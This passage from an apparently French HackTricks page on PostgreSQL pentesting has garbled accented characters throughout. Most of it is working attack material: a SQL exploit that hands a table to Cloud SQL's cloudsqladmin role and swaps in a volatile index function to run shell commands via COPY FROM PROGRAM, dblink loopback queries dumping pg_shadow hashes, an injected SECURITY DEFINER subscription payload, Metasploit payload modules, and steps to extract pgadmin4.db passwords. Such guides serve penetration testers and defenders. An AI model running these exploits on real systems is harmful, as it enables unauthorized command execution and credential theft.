En associant cette id√©e au fait que lorsque les commandes **INSERT/UPDATE/ANALYZE** sont ex√©cut√©es sur une **table avec une fonction d'index**, la **fonction** est **appel√©e** en tant que partie de la commande avec les **permissions du propri√©taire de la table**. Il est possible de cr√©er un index avec une fonction et de donner les permissions de propri√©taire √† un **superutilisateur** sur cette table, puis d'ex√©cuter ANALYZE sur la table avec la fonction malveillante qui pourra ex√©cuter des commandes car elle utilise les privil√®ges du propri√©taire.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. Cr√©ez une nouvelle table.
2. Ins√©rez du contenu factice dans la table, afin que la fonction d'index ait quelque chose √† traiter.
3. Cr√©ez une fonction d'index malveillante (avec notre charge utile d'ex√©cution de code) sur la table.
4. ALTEREZ le propri√©taire de la table en cloudsqladmin, le r√¥le superutilisateur de GCP utilis√© uniquement par Cloud SQL pour maintenir et g√©rer la base de donn√©es.
5. ANALYSEZ la table, for√ßant le moteur PostgreSQL √† passer en mode utilisateur du propri√©taire de la table (cloudsqladmin) et √† appeler la fonction d'index malveillante avec les autorisations de cloudsqladmin, ce qui permet d'ex√©cuter notre commande shell √† laquelle nous n'avions pas la permission d'ex√©cuter auparavant.

Dans PostgreSQL, ce processus ressemble √† ceci :
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Apr√®s l'ex√©cution de l'exploit de la requ√™te SQL, la table `shell_commands_results` contient la sortie du code ex√©cut√© :
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Connexion locale

Certaines instances de postgresql mal configur√©es peuvent autoriser la connexion de n'importe quel utilisateur local. Il est possible de se connecter localement depuis 127.0.0.1 en utilisant la fonction **`dblink`** :
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'Select usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
Notez que pour que la requ√™te pr√©c√©dente fonctionne, **la fonction `dblink` doit exister**. Si ce n'est pas le cas, vous pouvez essayer de la cr√©er avec
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Si vous avez le mot de passe d'un utilisateur disposant de privil√®ges sup√©rieurs, mais que l'utilisateur n'est pas autoris√© √† se connecter depuis une adresse IP externe, vous pouvez utiliser la fonction suivante pour ex√©cuter des requ√™tes en tant qu'utilisateur :
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'Select usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Il est possible de v√©rifier si cette fonction existe avec :
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Fonction d√©finie par l'utilisateur avec** SECURITY DEFINER

Dans [**ce compte rendu**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), les testeurs d'intrusion ont r√©ussi √† obtenir des privil√®ges √©lev√©s √† l'int√©rieur d'une instance PostgreSQL fournie par IBM, car ils ont **trouv√© cette fonction avec le drapeau SECURITY DEFINER** :

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
‚Ä¶
</code></pre>

Comme [**expliqu√© dans la documentation**](https://www.postgresql.org/docs/current/sql-createfunction.html), une fonction avec **SECURITY DEFINER est ex√©cut√©e** avec les privil√®ges de l'**utilisateur qui la poss√®de**. Par cons√©quent, si la fonction est **vuln√©rable √† l'injection SQL** ou effectue des **actions privil√©gi√©es avec des param√®tres contr√¥l√©s par l'attaquant**, elle peut √™tre exploit√©e pour **escalader les privil√®ges √† l'int√©rieur de PostgreSQL**.

√Ä la ligne 4 du code pr√©c√©dent, vous pouvez voir que la fonction a le drapeau **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
Et ensuite **ex√©cutez des commandes** :

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Passer Burteforce avec PL/pgSQL

PL/pgSQL, en tant que **langage de programmation complet**, permet un contr√¥le proc√©dural beaucoup plus avanc√© que SQL, y compris la **possibilit√© d'utiliser des boucles et d'autres structures de contr√¥le**. Les instructions SQL et les d√©clencheurs peuvent appeler des fonctions cr√©√©es dans le langage PL/pgSQL.\
**Vous pouvez abuser de ce langage pour demander √† PostgreSQL de forcer les informations d'identification des utilisateurs.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### journalisation

√Ä l'int√©rieur du fichier _**postgresql.conf**_, vous pouvez activer les journaux de PostgreSQL en modifiant :
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Ensuite, **red√©marrez le service**.

### pgadmin

[pgadmin](https://www.pgadmin.org) est une plateforme d'administration et de d√©veloppement pour PostgreSQL.\
Vous pouvez trouver les **mots de passe** √† l'int√©rieur du fichier _**pgadmin4.db**_.\
Vous pouvez les d√©crypter en utilisant la fonction _**decrypt**_ dans le script : [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

L'authentification du client est contr√¥l√©e par un fichier de configuration fr√©quemment appel√© _**pg\_hba.conf**_. Ce fichier contient un ensemble d'enregistrements. Un enregistrement peut avoir l'un des sept formats suivants :

![](https://lh4.googleusercontent.com/Ff8YbD3ppYmN2Omp-4M-0AAVhLsr4c2i7d7HUjgkE-O6NZ5zbaST1hdMPrp1AL\_xTXJalYe0HYxUk76vWJUfHZ5GuCDvIL1A-sMV44Z0CYSVgLM9ttFTDu-BhzewBGc7FeMarTLqsu\_N1ztXJg)

**Chaque** enregistrement **sp√©cifie** un **type de connexion**, une **plage d'adresses IP client** (si cela est pertinent pour le type de connexion), un **nom de base de donn√©es**, un **nom d'utilisateur** et la **m√©thode d'authentification** √† utiliser pour les connexions correspondant √† ces param√®tres. Le **premier enregistrement correspondant** avec un type de connexion, une adresse client, une base de donn√©es demand√©e et un nom d'utilisateur **est utilis√©** pour effectuer l'authentification. Il n'y a pas de "passage" ou de "sauvegarde" : **si un enregistrement est choisi et que l'authentification √©choue, les enregistrements suivants ne sont pas pris en compte**. Si aucun enregistrement ne correspond, l'acc√®s est refus√©.\
Les m√©thodes d'authentification bas√©es sur le mot de passe sont **md5**, **crypt** et **password**. Ces m√©thodes fonctionnent de mani√®re similaire, √† l'exception de la mani√®re dont le mot de passe est envoy√© via la connexion : respectivement, hach√© en MD5, crypt√© en crypt et en texte clair. Une limitation est que la m√©thode crypt ne fonctionne pas avec les mots de passe qui ont √©t√© crypt√©s dans pg\_authid.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour cr√©er et **automatiser facilement des flux de travail** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
